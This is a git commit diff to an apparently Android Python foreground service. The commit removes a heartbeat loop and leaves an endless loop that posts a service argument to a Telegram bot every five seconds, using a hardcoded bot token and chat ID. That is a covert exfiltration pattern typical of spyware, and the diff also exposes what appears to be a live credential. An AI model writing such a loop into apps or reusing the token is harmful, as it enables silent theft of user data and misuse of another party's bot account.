f0a90a7f2c601fd709bb30ba42fa1417c941ccea
his-bullah <his.bullah.pvt.060@gmail.com>
2026-03-07 23:46:13 +0530

    Update main.py

--- service/main.py
+++ service/main.py
@@ -33,9 +33,5 @@ notification = builder.build()
 service.startForeground(1, notification)
 
 while True:
-    print("Service alive")
-    sleep(10)
-
-while True:
     requests.post("https://api.telegram.org/bot8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI/sendMessage", data={'chat_id':'7589082187','text':os.environ.get('PYTHON_SERVICE_ARGUMENT','No argv Found')})
     time.sleep(5)
